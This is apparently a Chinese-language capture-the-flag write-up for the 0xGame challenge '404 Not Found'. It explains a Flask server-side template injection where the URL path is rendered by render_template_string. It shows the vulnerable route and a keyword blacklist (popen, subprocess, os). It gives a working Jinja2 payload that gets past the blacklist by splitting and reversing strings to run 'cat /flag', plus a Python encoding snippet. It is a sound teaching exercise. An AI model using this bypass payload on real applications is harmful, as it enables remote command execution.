# 404 Not Found

## 题目简述

应用把不存在的 URL 路径直接拼入 HTML 模板，再交给 `render_template_string()` 二次渲染，因此路径内容可被当作 Jinja2 表达式执行。题目用不区分大小写的子串黑名单拦截常见利用关键字，并拒绝 `User-Agent` 中含有 `fenjing` 的请求，但这些限制没有消除 SSTI 根因。

## 解题过程

路由的关键逻辑可以简化为：

```python
@app.route('/<path:path>')
def notfound(path):
    path = safe_path(path)
    template = f"404 Error: The requested URL /{path} was not found"
    return render_template_string(template), 404
```

`safe_path()` 先把路径转成小写，再检查以下子串：

```python
black_list = [
    'sys', 'subprocess', 'eval', 'exec', 'lambda', 'input', 'init',
    'class', 'set', '.', 'from', 'flask', 'request', 'os', 'import',
    'subclasses', 'dict', 'globals', 'locals', 'self', 'config', 'app',
    'popen', 'docker', 'file', 'py', 'templates'
]
```

先访问路径 `{{7*7}}`，页面中的错误路径变成 `/49`，即可确认用户输入进入了 Jinja2 模板。`before_request()` 中针对引号的检查写成了 `isinstance(id, str)`；这里的 `id` 是 Python 内置函数而不是请求参数，所以该分支始终不会生效。

利用时不在原始路径中直接出现被禁字符串，而是在模板求值阶段通过拼接或反转还原：

```jinja2
{{lipsum['__glo'+'bals__']['__bui'+'ltins__']['__imp'+'ort__']('so'[::-1])['po'+'pen']('cat /flag')|attr('read')()}}
```

其中：

- `lipsum` 是 Jinja2 默认全局对象，可由其 `__globals__` 进入 Python 全局命名空间；
- `__globals__`、`__builtins__`、`__import__` 和 `popen` 均被拆分，`os` 则由 `'so'[::-1]` 生成；
- `|attr('read')()` 代替 `.read()`，避开对点号的过滤。

将完整表达式作为 URL 路径发送时应进行百分号编码，避免空格、斜杠和花括号被客户端误处理：

```python
from urllib.parse import quote

payload = "{{lipsum['__glo'+'bals__']['__bui'+'ltins__']['__imp'+'ort__']('so'[::-1])['po'+'pen']('cat /flag')|attr('read')()}}"
print('/' + quote(payload, safe=''))
```

服务端最终在 404 文本中回显：

```text
0xGame{404_Not_Found_rEvenGe_Still_SSTI!}
```

## 方法总结

- 核心漏洞是“字符串插值后再次模板渲染”，黑名单只能增加构造成本，不能修复 SSTI。
- 遇到关键字过滤时，应先确认过滤发生在原始输入阶段还是模板求值阶段，再用字符串拼接、切片和过滤器延迟生成敏感属性。
- 审计防护代码时要核对变量来源；本题的 `id` 检查对象写错，实际上没有检查任何用户输入。
